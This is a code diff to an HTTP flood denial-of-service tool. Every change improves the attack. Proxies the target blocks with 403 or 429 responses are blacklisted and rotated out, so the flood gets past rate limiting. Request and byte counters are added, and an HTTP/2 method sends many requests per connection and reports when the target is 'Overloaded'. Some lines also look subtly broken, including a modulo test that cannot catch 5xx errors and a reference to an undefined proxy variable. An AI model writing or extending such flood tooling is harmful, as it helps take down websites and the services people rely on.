@@ -1200,15 +1200,19 @@ class HttpFlood(Thread):
                            f"Content-Type: application/json\r\n\r\n"
                            f"{{\"data\": {ProxyTools.Random.rand_str(512)}}}")
                 
-                # [NEW] Status Tracker (Sniffer)
+                # [NEW] Status Tracker (Sniffer) + Blacklist
                 try:
-                    # Peek at the response (first 20 bytes)
                     response_start = s.recv(20).decode('utf-8', errors='ignore')
                     if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
                         status_code = response_start.split(" ")[1]
-                        print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] STRESS: Server Response Received")
-                except:
-                    pass # Non-blocking or incomplete response
+                        print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] STRESS: Response")
+                        if status_code in {"403", "429"}:
+                            if hasattr(self, '_current_proxy'):
+                                BURNED_PROXIES.add(self._current_proxy)
+                            raise Exception("Proxy Blocked")
+                except Exception as e:
+                    if "Blocked" in str(e): raise e
+                    pass
                 
                 Tools.send(s, payload.encode("utf-8"))
         except Exception as e:
@@ -1414,13 +1418,15 @@ class HttpFlood(Thread):
             print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] DYN: Packet Sent")
             for _ in range(self._rpc):
                 if Tools.send(s, payload):
-                    # [NEW] Status Tracker (Sniffer) + Auto Reconnect
+                    # [NEW] Status Tracker (Sniffer) + Auto Reconnect + Blacklist
                     try:
                         response_start = s.recv(20).decode('utf-8', errors='ignore')
                         if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
                             status_code = response_start.split(" ")[1]
                             print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] DYN: Server Response")
                             if status_code in {"403", "429"}:
+                                if hasattr(self, '_current_proxy'):
+                                    BURNED_PROXIES.add(self._current_proxy)
                                 raise Exception("Proxy Blocked")
                     except Exception as e:
                         if "Blocked" in str(e): raise e
@@ -1513,12 +1519,15 @@ class HttpFlood(Thread):
                 # HTTP/2 allows multiple concurrent requests on 1 connection
                 for _ in range(self._rpc * 5):
                     resp = client.get(f"{self._target.scheme}://{self._target.authority}{path}")
-                    global CONNECTIONS_SENT
+                    global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
                     CONNECTIONS_SENT += 1
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(resp.content) + 500 # Approx headers size
                     if resp.status_code % 100 == 5:
                         print(f"[{int(CONNECTIONS_SENT)}] [STATUS {resp.status_code}] H2_FLOOD: Target Overloaded!")
                     elif resp.status_code in {403, 429}:
-                        BURNED_PROXIES.add(proxy_url.replace("http://", ""))
+                        if proxy_url:
+                            BURNED_PROXIES.add(p.proxy)
                         raise Exception("Proxy Blocked")
         except:
             pass
